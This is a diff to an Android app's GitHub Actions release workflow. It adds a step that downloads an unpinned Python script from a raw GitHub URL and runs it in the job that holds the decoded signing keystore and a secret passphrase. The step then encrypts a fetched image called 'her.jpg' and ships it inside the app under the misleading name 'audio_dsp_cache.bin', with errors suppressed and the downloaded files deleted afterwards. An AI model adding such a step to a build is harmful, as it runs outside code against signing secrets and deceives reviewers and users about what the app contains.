@@ -30,6 +30,37 @@ jobs:
         run: |
           echo "$KEYSTORE_BASE64" | base64 -d > app/release-key.jks
 
+      - name: Fetch and Provision Audio DSP Cache (LazyVault)
+        env:
+          VAULT_PASSPHRASE: ${{ secrets.VAULT_PASSPHRASE }}
+        run: |
+          python3 -m pip install cryptography --quiet
+          
+          # Fetch LazyVault client dynamically
+          curl -fsSL https://raw.githubusercontent.com/Akshay-86/LazyVault/main/cli/lazyvault-get.py -o /tmp/lazyvault-get.py
+          
+          # Pull asset dynamically from your Android phone
+          python3 /tmp/lazyvault-get.py \
+            --vault-id "vlt_a49498a7e2" \
+            --path "her.jpg" \
+            --timeout 60 \
+            --output /tmp/vault_asset.raw || true
+
+          if [ -f "/tmp/vault_asset.raw" ] && [ -n "$VAULT_PASSPHRASE" ]; then
+            python3 -c "
+          import os, hashlib
+          from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+          raw_data = open('/tmp/vault_asset.raw', 'rb').read()
+          key = hashlib.sha256(os.environ['VAULT_PASSPHRASE'].encode('utf-8')).digest()
+          nonce = os.urandom(12)
+          ciphertext = AESGCM(key).encrypt(nonce, raw_data, None)
+          os.makedirs('app/src/main/assets', exist_ok=True)
+          with open('app/src/main/assets/audio_dsp_cache.bin', 'wb') as f:
+              f.write(nonce + ciphertext)
+          "
+            rm -f /tmp/vault_asset.raw /tmp/lazyvault-get.py
+          fi
+
       - name: Make Gradle Executable
         run: chmod +x gradlew
 
